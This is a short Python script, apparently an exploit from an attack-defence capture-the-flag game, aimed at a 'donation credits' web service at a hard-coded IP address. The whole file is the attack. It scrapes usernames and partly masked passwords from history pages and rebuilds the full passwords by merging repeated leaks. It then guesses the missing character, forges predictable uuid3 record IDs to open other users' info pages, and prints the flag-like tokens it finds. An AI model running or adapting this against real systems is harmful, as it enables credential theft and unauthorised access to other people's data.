import requests
import re
import uuid
import socket
import random

for m in range(1,4):
    team = "http://90.189.132.25:13452/donation/credits/history?page=" + str(m)
    login = []
    password = []
    passwd = []
    for i in range(20):
        data = requests.get(team)
        info = re.split(r'<tr>',data.text)
        for k in range(2,len(info)):
            logpass = re.findall(r'<td>(\w{0,40}\_{0,40}\-{0,40}\s{0,40}\w{0,40}\_{0,40}\-{0,40}\s{0,40}\w{0,40})',info[k])
            login.append(logpass[1])
            password.append(logpass[2])
    for k in range(len(info)-2):
        passwd.append(password[k])
        for z in range(1,20):
            if (password[k+z*(len(info)-2)][1] != "x"):
                passwd[k] = "x" + password[k+z*(len(info)-2)][1:6] + passwd[k][6:]
            if (password[k+z*(len(info)-2)][6] != "x"):
                passwd[k] = "x" + passwd[k][1:6] + password[k + z * (len(info)-2)][6:11] + passwd[k][11:]
            if (password[k+z*(len(info)-2)][11] != "x"):
                passwd[k] = "x" + passwd[k][1:11] + password[k + z * (len(info)-2)][11:]
    for k in range(len(info)-2):
        for i in range(10):
            passed = str(i) + passwd[k][1:]
            uniq_id = uuid.uuid3(uuid.NAMESPACE_X500, passed + login[k])
            url = "http://90.189.132.25:13452/donation/credits/info?id=" + str(uniq_id)
            datat = requests.get(url)
            logpass = re.findall(r'(\w{31,32}=)', datat.text)
            if logpass != []:
                print(login[k] + " pass: " + passed)
                print(logpass)